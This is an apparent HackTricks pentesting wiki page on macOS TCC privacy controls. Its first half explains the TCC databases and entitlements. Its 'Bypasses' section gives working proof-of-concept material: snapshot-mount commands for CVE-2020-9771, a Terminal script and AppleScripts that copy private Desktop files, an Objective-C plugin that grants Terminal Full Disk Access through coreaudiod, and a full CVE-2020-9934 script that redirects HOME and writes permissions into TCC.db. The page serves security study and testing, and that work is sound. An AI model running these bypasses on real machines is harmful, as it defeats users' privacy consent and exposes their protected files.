# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Basic Information**

**TCC (Transparency, Consent, and Control)** is a mechanism in macOS to **limit and control application access to certain features**, usually from a privacy perspective. This can include things such as location services, contacts, photos, microphone, camera, accessibility, full disk access, and a bunch more.

From a user’s perspective, they see TCC in action **when an application wants access to one of the features protected by TCC**. When this happens the **user is prompted** with a dialog asking them whether they want to allow access or not.

It's also possible to **grant apps access** to files by **explicit intents** from users for example when a user **drags\&drop a file into a program** (obviously the program should have access to it).

![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** is handled by the **daemon** located in `/System/Library/PrivateFrameworks/TCC.framework/Resources/tccd`configured in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registering the mach service `com.apple.tccd.system`).

There is a **user-mode tccd** running per logged in user defined in `/System/Library/LaunchAgents/com.apple.tccd.plist` registering the mach services `com.apple.tccd` and `com.apple.usernotifications.delegate.com.apple.tccd`.

Permissions are **inherited from the parent** application and the **permissions** are **tracked** based on the **Bundle ID** and the **Developer ID**.

### TCC Database

The selections is then stored in the TCC system-wide database in **`/Library/Application Support/com.apple.TCC/TCC.db`** or in **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** for per-user preferences. The database is **protected from editing with SIP**(System Integrity Protection), but you can read them by granting **full disk access**.

{% hint style="info" %}
The **notification center UI** can make **changes in the system TCC database**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

However, users can **delete or query rules** with the **`tccutil`** command line utility.
{% endhint %}

{% tabs %}
{% tab title="user DB" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endtab %}

{% tab title="system DB" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Checking both databases you can check the permissions an app has allowed, has forbidden, or doesn't have (it will ask for it).
{% endhint %}

* The **`auth_value`** can have different values: denied(0), unknown(1), allowed(2), or limited(3).
* The **`auth_reason`** can take the following values: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* For more information about the **other fields** of the table [**check this blog post**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

{% hint style="info" %}
Some TCC permissions are: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... There is no public list that defines all of them but you can check this [**list of known ones**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).
{% endhint %}

You could also check **already given permissions** to apps in `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

### TCC Signature Checks

The TCC **database** stores the **Bundle ID** of the application, but it also **stores** **information** about the **signature** to **make sure** the App asking to use the a permission is the correct one.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"

```
{% endcode %}

### Entitlements

Apps **don't only need** to **request** and have been **granted access** to some resources, they also need to **have the relevant entitlements**.\
For example **Telegram** has the entitlement `com.apple.security.device.camera` to request **access to the camera**. An **app** that **doesn't** have this **entitlement won't be able** to access the camera (and the user won't be be even asked for the permissions).

However, for apps to **access** to **certain user folders**, such as `~/Desktop`, `~/Downloads` and `~/Documents`, they **don't need** to have any specific **entitlements.** The system will transparently handle access and **prompt the user** as needed.

Apple's apps **won’t generate prompts**. They contain **pre-granted rights** in their **entitlements** list, meaning they will **never generate a popup**, **nor** they will show up in any of the **TCC databases.** For example:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

This will avoid Calendar ask the user to access reminders, calendar and the address book.

### Sensitive unprotected places

* $HOME (itself)
* $HOME/.ssh, $HOME/.aws, etc
* /tmp

### User Intent / com.apple.macl

As mentioned previously, it possible to **grant access to an App to a file by drag\&dropping it to it**. This access won't be specified in any TCC database but as an **extended** **attribute of the file**. This attribute will **store the UUID** of the allowed app:

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

{% hint style="info" %}
It's curious that the **`com.apple.macl`** attribute is managed by the **Sandbox**, not tccd
{% endhint %}

The extended attribute `com.apple.macl` **can’t be cleared** like other extended attributes because it’s **protected by SIP**. However, as [**explained in this post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), it's possible to disable it **zipping** the file, **deleting** it and **unzipping** it.

## Bypasses

### CVE-2020-9771 - mount\_apfs TCC bypass and privilege escalation

**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### Write Bypass

This is not a bypass, it's just how TCC works: **It doesn't protect from writing**. If Terminal **doesn't have access to read the Desktop of a user it can still write into it**:

```shell-session
username@hostname ~ % ls Desktop 
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

The **extended attribute `com.apple.macl`** is added to the new **file** to give the **creators app** access to read it.

### SSH Bypass

By default an access via **SSH** will have **"Full Disk Access"**. In order to disable this you need to have it listed but disabled (removing it from the list won't remove those privileges):

![](<../../.gitbook/assets/image (569).png>)

Here you can find examples of how some **malwares have been able to bypass this protection**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

### Electron Bypass

The JS code of an Electron App is not signed, so an attacker could move the app to a writable location, inject malicious JS code and launch that app and abuse the TCC permissions.

Electron is working on **`ElectronAsarIntegrity`** key in Info.plist that will contain a hash of the app.asar file to check the integrity of the JS code before executing it.

### Terminal Scripts

It's quiet common to give terminal **Full Disk Access (FDA)**, at least in computers used by tech people. And it's possible to invoke **`.terminal`** scripts using with it.

**`.terminal`** scripts are plist files such as this one with the command to execute in the **`CommandString`** key:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

An application could write a terminal script in a location such as /tmp and launch it with a come such as:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

### kTCCServiceAppleEvents / Automation

An app with the **`kTCCServiceAppleEvents`** permission will be able to **control other Apps**. This means that it could be able to **abuse the permissions granted to the other Apps**.

For example, if an App has **Automation permission over `iTerm`**, for example in this example **`Terminal`** has access over iTerm:

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, who doesn't have FDA, can call iTerm, which has it, and use it to perform actions:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```
{% endcode %}

```bash
osascript iterm.script
```

#### Over Finder

Or if an App has access over Finder, it could a script such as this one:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

### Code Injection Bypass

I you manage to **inject code in a process** you will be able to abuse the TCC permissions of that process. See some examples in the following sections:

### CVE-2020-29621 - Coreaudiod

The binary **`/usr/sbin/coreaudiod`** had the entitlements `com.apple.security.cs.disable-library-validation` and `com.apple.private.tcc.manager`. The first **allowing code injection** and second one giving it access to **manage TCC**.

This binary allowed to load **third party plug-ins** from the folder `/Library/Audio/Plug-Ins/HAL`. Therefore, it was possible to **load a plugin and abuse the TCC permissions** with this PoC:

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");
    
    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);
    
    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {
    
    add_tcc_entry();
    
    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

The userland **tccd daemon** what using the **`HOME`** **env** variable to access the TCC users database from: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

According to [this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) and because the TCC daemon is running via `launchd` within the current user’s domain, it's possible to **control all environment variables** passed to it.\
Thus, an **attacker could set `$HOME` environment** variable in **`launchctl`** to point to a **controlled** **directory**, **restart** the **TCC** daemon, and then **directly modify the TCC database** to give itself **every TCC entitlement available** without ever prompting the end user.\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"                     
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump                                                               
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2023-26818 - Telegram

Telegram had the entitlements `com.apple.security.cs.allow-dyld-environment-variables` and c`om.apple.security.cs.disable-library-validation`, so it was possible to abuse it to **get access to its permissions** such recording with the camera. You can [**find the payload in the writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

## References

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
